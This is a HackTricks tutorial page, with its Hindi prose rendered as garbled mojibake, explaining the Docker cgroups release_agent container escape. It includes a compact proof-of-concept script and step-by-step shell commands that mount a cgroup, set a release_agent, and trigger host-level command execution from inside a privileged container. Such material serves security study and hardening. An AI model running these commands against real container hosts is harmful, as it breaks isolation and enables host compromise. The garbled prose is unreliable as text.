# Docker release\_agent cgroups escape

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг AWS рд░реЗрдб рдЯреАрдо рд╡рд┐рд╢реЗрд╖рдЬреНрдЮ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг GCP рд░реЗрдб рдЯреАрдо рд╡рд┐рд╢реЗрд╖рдЬреНрдЮ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github рд░реЗрдкреЛ рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗред

</details>
{% endhint %}

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) рдПрдХ **рдбрд╛рд░реНрдХ-рд╡реЗрдм** рдкрд░ рдЖрдзрд╛рд░рд┐рдд рдЦреЛрдЬ рдЗрдВрдЬрди рд╣реИ рдЬреЛ **рдирд┐:рд╢реБрд▓реНрдХ** рд╕реБрд╡рд┐рдзрд╛рдПрдВ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдпрд╣ рдЬрд╛рдВрдЪ рд╕рдХреЗрдВ рдХрд┐ рдХреЛрдИ рдХрдВрдкрдиреА рдпрд╛ рдЙрд╕рдХреЗ рдЧреНрд░рд╛рд╣рдХреЛрдВ рдХреЛ **рд╕реНрдЯреАрд▓рд░ рдореИрд▓рд╡реЗрдпрд░реНрд╕** рджреНрд╡рд╛рд░рд╛ **рдХрдВрдкреНрд░реЛрдорд╛рдЗрдЬ** рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдпрд╛ рдирд╣реАрдВред

WhiteIntel рдХрд╛ рдореБрдЦреНрдп рдЙрджреНрджреЗрд╢реНрдп рдЦрд╛рддрд╛ рд╣рд╕реНрддрд╛рдВрддрд░рдг рдФрд░ рдЬрд╛рдирдХрд╛рд░реА рдЪреЛрд░реА рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдореИрд▓рд╡реЗрдпрд░ рд╕реЗ рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ рд░реИрдВрд╕рдорд╡реЗрдпрд░ рд╣рдорд▓реЛрдВ рдХрд╛ рдореБрдХрд╛рдмрд▓рд╛ рдХрд░рдирд╛ рд╣реИред

рдЖрдк рдЙрдирдХреА рд╡реЗрдмрд╕рд╛рдЗрдЯ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **рдирд┐:рд╢реБрд▓реНрдХ** рдореЗрдВ рдЙрдирдХрд╛ рдЗрдВрдЬрди рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

{% embed url="https://whiteintel.io" %}

***

**рдЕрдзрд┐рдХ рд╡рд┐рд╡рд░рдг рдХреЗ рд▓рд┐рдП, рдореВрд▓ рдмреНрд▓реЙрдЧ рдкреЛрд╕реНрдЯ**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)** рдХрд╛ рд╕рдВрджрд░реНрдн рджреЗрдЦреЗрдВред рдпрд╣ рдХреЗрд╡рд▓ рдПрдХ рд╕рд╛рд░рд╛рдВрд╢ рд╣реИ:**

рдореВрд▓ PoC:
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
рдкреНрд░рдорд╛рдг рд╕рдВрджрд░реНрдн (PoC) рдПрдХ рд╡рд┐рдзрд┐ рдХрд╛ рдкреНрд░рджрд░реНрд╢рди рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕рд╕реЗ cgroups рдХрд╛ рд╢реЛрд╖рдг рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдПрдХ `release_agent` рдлрд╝рд╛рдЗрд▓ рдмрдирд╛рдХрд░ рдФрд░ рдЗрд╕рдХреЗ рдЖрд╣реНрд╡рд╛рди рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рдХреЗ рдХрдВрдЯреЗрдирд░ рд╣реЛрд╕реНрдЯ рдкрд░ рд╡рд┐рднрд┐рдиреНрди рдХрдорд╛рдВрдбреНрд╕ рдХреЛ рдирд┐рд╖реЗрдзрд╛рддреНрдордХ рд░реВрдк рд╕реЗ рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдПред рдпрд╣рд╛рдБ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ рдЬреЛ рдХрджрдо рд╢рд╛рдорд┐рд▓ рд╣реИрдВ:

1. **рдкрд░реНрдпрд╛рд╡рд░рдг рдХреА рддреИрдпрд╛рд░реА:**
* рдПрдХ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ `/tmp/cgrp` рдмрдирд╛рдИ рдЧрдИ рд╣реИ рдЬреЛ cgroup рдХреЗ рд▓рд┐рдП рдорд╛рдЙрдВрдЯ рдкреЙрдЗрдВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рд╕реЗрд╡рд╛ рдХрд░реЗрдЧреАред
* RDMA cgroup рдирд┐рдпрдВрддреНрд░рдХ рдХреЛ рдЗрд╕ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдкрд░ рдорд╛рдЙрдВрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред RDMA рдирд┐рдпрдВрддреНрд░рдХ рдХреА рдЕрдиреБрдкрд╕реНрдерд┐рддрд┐ рдХреЗ рдорд╛рдорд▓реЗ рдореЗрдВ, рдПрдХ рд╡реИрдХрд▓реНрдкрд┐рдХ рд░реВрдк рд╕реЗ `memory` cgroup рдирд┐рдпрдВрддреНрд░рдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рд╕рд┐рдлрд╛рд░рд┐рд╢ рдХреА рдЬрд╛рддреА рд╣реИред
```shell
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```
2. **рдмрдЪреНрдЪрд╛ рд╕реАрдЧреНрд░реБрдк рд╕реЗрдЯ рдЕрдк рдХрд░реЗрдВ:**
* рдорд╛рдЙрдВрдЯ рдХрд┐рдП рдЧрдП рд╕реАрдЧреНрд░реБрдк рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреЗ рднреАрддрд░ "x" рдирд╛рдо рдХрд╛ рдПрдХ рдмрдЪреНрдЪрд╛ рд╕реАрдЧреНрд░реБрдк рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
* "x" рд╕реАрдЧреНрд░реБрдк рдХреЗ рд▓рд┐рдП рд╕реВрдЪрдирд╛рдПрдВ рд╕рдХреНрд╖рдо рдХреА рдЬрд╛рддреА рд╣реИрдВ рдЬрд┐рд╕рдХреЗ рд▓рд┐рдП рдЙрд╕рдХреЗ notify\_on\_release рдлрд╝рд╛рдЗрд▓ рдореЗрдВ 1 рд▓рд┐рдЦрдХрд░ред
```shell
echo 1 > /tmp/cgrp/x/notify_on_release
```
3. **рд░рд┐рд▓реАрдЬ рдПрдЬреЗрдВрдЯ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░реЗрдВ:**
* рд╣реЛрд╕реНрдЯ рдкрд░ рдХрдВрдЯреЗрдирд░ рдХрд╛ рдкрде /etc/mtab рдлрд╝рд╛рдЗрд▓ рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
* рдлрд┐рд░ cgroup рдХрд╛ release\_agent рдлрд╝рд╛рдЗрд▓ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдПрдХ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЬрд┐рд╕рдХрд╛ рдирд╛рдо /cmd рд╣реИ рдЬреЛ рдкреНрд░рд╛рдкреНрдд рд╣реЛрд╕реНрдЯ рдкрде рдкрд░ рд╕реНрдерд┐рдд рд╣реИ, рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВред
```shell
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
4. **/cmd рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдмрдирд╛рдПрдВ рдФрд░ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░реЗрдВ:**
* /cmd рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдХрд┐ ps aux рдХреЛ execute рдХрд░реЗрдВ, рдЬреЛ рдЖрдЙрдЯрдкреБрдЯ рдХреЛ рдХрдВрдЯреЗрдирд░ рдореЗрдВ /output рдирд╛рдордХ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ redirect рдХрд░реЗрдЧрд╛ред /output рдХрд╛ рдкреВрд░рд╛ рдкрде рд╣реЛрд╕реНрдЯ рдкрд░ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
```shell
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
```
5. **рд╣рдорд▓рд╛ рдкреНрд░рд╛рд░рдВрдн рдХрд░реЗрдВ:**
* рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ "x" рдмрд╛рд▓ cgroup рдХреЗ рдЕрдВрджрд░ рдкреНрд░рд╛рд░рдВрдн рдХреА рдЬрд╛рддреА рд╣реИ рдФрд░ рддреБрд░рдВрдд рд╕рдорд╛рдкреНрдд рд╣реЛ рдЬрд╛рддреА рд╣реИред
* рдЗрд╕рд╕реЗ `release_agent` (/cmd рд╕реНрдХреНрд░рд┐рдкреНрдЯ) рдХреЛ рдЯреНрд░рд┐рдЧрд░ рд╣реЛрддрд╛ рд╣реИ, рдЬреЛ рд╣реЛрд╕реНрдЯ рдкрд░ ps aux рдХрд╛ рдирд┐рд╖реНрдкрд╛рджрди рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЖрдЙрдЯрдкреБрдЯ рдХреЛ рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ /output рдореЗрдВ рд▓рд┐рдЦрддрд╛ рд╣реИред
```shell
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) рдПрдХ **рдбрд╛рд░реНрдХ-рд╡реЗрдм** рдкрд░ рдЖрдзрд╛рд░рд┐рдд рдЦреЛрдЬ рдЗрдВрдЬрди рд╣реИ рдЬреЛ **рдореБрдлреНрдд** рд╕реБрд╡рд┐рдзрд╛рдПрдВ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЬрд╛рдВрдЪ рд╕рдХреЗрдВ рдХрд┐ рдХреЛрдИ рдХрдВрдкрдиреА рдпрд╛ рдЙрд╕рдХреЗ рдЧреНрд░рд╛рд╣рдХреЛрдВ рдХреЛ **рд╕реНрдЯреАрд▓рд░ рдореИрд▓рд╡реЗрдпрд░реНрд╕** рджреНрд╡рд╛рд░рд╛ **рдХрдВрдкреНрд░реЛрдорд╛рдЗрдЬ** рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

WhiteIntel рдХрд╛ рдореБрдЦреНрдп рдЙрджреНрджреЗрд╢реНрдп рдЦрд╛рддрд╛ рд╣рд╛рд╕рд┐рд▓ рдХрд░рдиреЗ рдФрд░ рдЬрд╛рдирдХрд╛рд░реА рдЪреБрд░рд╛рдиреЗ рд╡рд╛рд▓реЗ рдореИрд▓рд╡реЗрдпрд░ рд╕реЗ рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ рд░реИрдВрд╕рдорд╡реЗрдпрд░ рд╣рдорд▓реЛрдВ рдХрд╛ рдореБрдХрд╛рдмрд▓рд╛ рдХрд░рдирд╛ рд╣реИред

рдЖрдк рдЙрдирдХреА рд╡реЗрдмрд╕рд╛рдЗрдЯ рдЪреЗрдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрдирдХреЗ рдЗрдВрдЬрди рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ **рдореБрдлреНрдд** рдореЗрдВ:

{% embed url="https://whiteintel.io" %}

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг AWS рд░реЗрдб рдЯреАрдо рдПрдХреНрд╕рдкрд░реНрдЯ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг GCP рд░реЗрдб рдЯреАрдо рдПрдХреНрд╕рдкрд░реНрдЯ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github рд░реЗрдкреЛ рдореЗрдВред

</details>
{% endhint %}
